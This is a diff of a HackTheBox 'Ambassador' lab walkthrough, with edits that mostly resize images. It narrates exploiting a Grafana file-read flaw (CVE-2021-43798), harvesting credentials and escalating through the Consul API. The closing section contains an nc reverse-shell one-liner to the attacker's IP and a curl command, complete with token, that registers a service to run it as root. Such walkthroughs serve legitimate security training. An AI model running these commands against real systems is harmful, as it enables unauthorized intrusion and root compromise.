@@ -11,7 +11,7 @@ description: HTB - Ambassador walkthrough
 # Ambassador
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/ambassador/banner.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/ambassador/banner.png" width="70%"/>
 </p>
 
 
@@ -94,25 +94,23 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 We can see a website talking about some credentials for the _developer_ account, but there is not to much to enumerate. The Hugo component is up-to-date with no current vulns:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/ambassador/1_0_we.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/ambassador/1_0_we.png" width="80%"/>
 </p>
 
 Also, the MySQL is not vulnerable, quick bruteforce for basic users and password didn't turn out well. Then I realized the port 3000 is identified by nmap as _ppp_. It catched my attention and since there is no much to keep going I check that out and turned out to be a **Grafana server version v8.2.0 (d7f71e9eae)**:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/ambassador/1_1_grafana.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/ambassador/1_1_grafana.png" width="80%"/>
 </p>
 
 That version is vulnerable to [CVE-2021-43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798), a Local File Inclusion (LFI) issue that allow us to read arbitrary files from the server. There are [public exploits](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798) for it, so I tried it. I cloned the repository and installed the requirements:
 
 ```bash
-
 git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798.git
 cd exploit-grafana-CVE-2021-43798
 python3.9 -m pip install -r requirements.txt
 echo "http://10.10.11.183:3000" > list.txt
 python3.9 exploit.py
-
 ```
 
 Now run the exploit and get the information.
@@ -126,7 +124,7 @@ We cannot decrypt any of the passwords by the original method, so let's manually
 
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/ambassador/2_0_sqlite.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/ambassador/2_0_sqlite.png" width="80%"/>
 </p>
 
 
@@ -135,7 +133,7 @@ We cannot decrypt any of the passwords by the original method, so let's manually
 Using MySQL cliente, we use those credentials and we are into the database:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/ambassador/3_0_db.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/ambassador/3_0_db.png" width="70%"/>
 </p>
 
 Going for a quick enumeration we can see an interesting batabase called _whackywidget_. Checking it's tables we can see one called _users_. Within it we have a user called _developer_ with a base64 password. It could be the one mentioned on the website for the SSH:
@@ -172,7 +170,7 @@ Converting from Base64 we get a new set of credentials that we will try on the S
 And we are in, let's grab the user flag:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/ambassador/4_0_in.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/ambassador/4_0_in.png" width="70%"/>
 </p>
 
 
@@ -183,13 +181,13 @@ We are not allowed to run sudo, so let's load linpeas while doing some other man
 Checking processes with pspy64 we can see a cleanup.sh that runs find with the wildcard. It can be exploited so I left it on the checking list.
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/ambassador/6_1_pspy.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/ambassador/6_1_pspy.png" width="75%"/>
 </p>
 
 Also we have execution permissions on that _/etc/consul.d/config.d_ directory, so we could create files to try exploiting it. Some first tests didn't turned out well so I keep enumerating the machine.
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/ambassador/7_1_.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/ambassador/7_1_.png" width="95%"/>
 </p>
 
 Linpeas displayed some interesting files, including the following git related ones:
@@ -212,7 +210,7 @@ The .gitconfig has the following content:
 Let's check that repo on _/opt/my-app_. First thing I check are the _git logs_:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/ambassador/5_0_gitlog.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/ambassador/5_0_gitlog.png" width="70%"/>
 </p>
 
 For retrieving the changes on the different commits, use the _-p_ flag. It usually contains interesing files or sensitive data that was deleted. 
@@ -238,7 +236,6 @@ Service data:
 Bash script and request to register the service:
 
 ```bash
-
 echo "mkfifo /tmp/f; nc 10.10.14.2 5456 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f" > /tmp/test.sh
 
 curl -H "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" -X PUT -d '{"ID": "kash","Name": "kash","Address": "127.0.0.1","Port": 80,"check": {"Args": ["/bin/bash", "/tmp/test.sh"],"interval": "10s","Timeout": "100s"}}' http://127.0.0.1:8500/v1/agent/service/register
@@ -247,6 +244,6 @@ curl -H "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" -X PUT -d '{"ID":
 Once we send the PUT request to register the service, we get the reverse root shell and the flag:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/ambassador/8_0_root.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/ambassador/8_0_root.png" width="95%"/>
 </p>
 
